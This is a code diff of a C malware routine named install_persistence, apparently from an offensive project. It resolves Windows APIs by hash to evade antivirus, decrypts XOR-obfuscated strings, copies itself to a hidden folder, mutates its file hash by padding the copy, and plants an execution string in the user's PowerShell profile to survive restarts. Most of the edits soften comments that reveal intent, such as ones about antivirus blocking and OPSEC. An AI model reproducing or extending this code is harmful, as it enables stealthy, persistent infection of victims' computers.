@@ -5,9 +5,7 @@
 #include <shlobj.h>
 #include <stdio.h>
 
-// --- typedefs for API Hashing
-
-// for kernel32 APIs
+// --- typedefs definition
 typedef DWORD (WINAPI *pGetEnvironmentVariableA)(LPCSTR lpName, LPSTR lpBuffer, DWORD nSize);
 typedef BOOL (WINAPI *pCopyFileA)(LPCSTR lpExistingFileName, LPCSTR lpNewFileName, BOOL bFailIfExists);
 typedef HANDLE (WINAPI *pCreateFileA)(LPCSTR lpFileName, DWORD dwDesiredAccess, DWORD dwShareMode, LPSECURITY_ATTRIBUTES lpSecurityAttributes, DWORD dwCreationDisposition, DWORD dwFlagsAndAttributes, HANDLE hTemplateFile);
@@ -16,14 +14,13 @@ typedef BOOL (WINAPI *pCloseHandle)(HANDLE hObject);
 typedef DWORD (WINAPI *pGetTickCount)(void);
 typedef BOOL (WINAPI *pCreateDirectoryA)(LPCSTR lpPathName, LPSECURITY_ATTRIBUTES lpSecurityAttributes);
 typedef BOOL (WINAPI *pSetFileAttributesA)(LPCSTR lpFileName, DWORD dwFileAttributes);
-
-// for shell32 APIs
 typedef HRESULT (WINAPI *pSHGetFolderPathA)(HWND hwnd, int csidl, HANDLE hToken, DWORD dwFlags, LPSTR pszPath);
 
 bool install_persistence(const char* current_exe_path) {
     // load key runtime (in stack)
     LOAD_GLOBAL_KEY(cypher_key, cypher_key_len);
 
+    // encoded strings
     char enc_kernel32[] = { 0x34, 0x16, 0x07, 0x1e, 0x56, 0x1f, 0x00, 0x51, 0x5c, 0x57, 0x18, 0x07, 0x33 };
     // string: "APPDATA"
     char enc_AppData[] = { 0x1e, 0x23, 0x25, 0x34, 0x72, 0x27, 0x72, 0x63, 0x72 };
@@ -62,7 +59,7 @@ bool install_persistence(const char* current_exe_path) {
 
     if (!hKernel32 || !hShell32) return false;
 
-    // --- dynamic resolution via hashing
+    // --- dynamic API resolution via hashing
     
     pGetEnvironmentVariableA fnGetEnvVarA = (pGetEnvironmentVariableA) get_api_by_hash(hKernel32, hash_GetEnvVarA);
     pCopyFileA fnCopyFileA = (pCopyFileA) get_api_by_hash(hKernel32, hash_CopyFileA);
@@ -74,7 +71,7 @@ bool install_persistence(const char* current_exe_path) {
     pSetFileAttributesA fnSetFileAttributesA = (pSetFileAttributesA) get_api_by_hash(hKernel32, hash_SetFileAttributesA);
     pSHGetFolderPathA fnSHGetFolderPathA = (pSHGetFolderPathA) get_api_by_hash(hShell32, hash_SHGetFolderPathA);
 
-    // if AV blocks a function -> return
+    // if a function fail to load -> return
     if (!fnGetEnvVarA || !fnCopyFileA || !fnCreateFileA || !fnWriteFile || !fnCloseHandle || !fnCreateDirectoryA || !fnSetFileAttributesA || !fnSHGetFolderPathA) { 
         #ifdef DEBUG
         printf("[-] Error: One or more API hash failed to resolve.\n");
@@ -110,7 +107,7 @@ bool install_persistence(const char* current_exe_path) {
 
         fnCopyFileA(current_exe_path, dest_path, FALSE);
 
-        // --- hash mutation (overlay padding)
+        // --- hash mutation
 
         HANDLE hFile = fnCreateFileA(dest_path, FILE_APPEND_DATA, 0, NULL, OPEN_EXISTING, FILE_ATTRIBUTE_NORMAL, NULL);
         if (hFile != INVALID_HANDLE_VALUE) {
@@ -141,7 +138,6 @@ bool install_persistence(const char* current_exe_path) {
         #endif
         xor_crypt(enc_psFolder, sizeof(enc_psFolder), cypher_key, cypher_key_len);
         
-        // create directory (fails silently if it already exists)
         fnCreateDirectoryA(docs_folder, NULL);
         
         // append \Microsoft.PowerShell_profile.ps1
@@ -158,7 +154,6 @@ bool install_persistence(const char* current_exe_path) {
         #ifdef DEBUG
         printf("[!] Using execution string: %s.\n", ps_payload);
         #endif
-        // OPSEC: recypher immediately
         xor_crypt(enc_psPayload, sizeof(enc_psPayload), cypher_key, cypher_key_len);
 
         // write the file
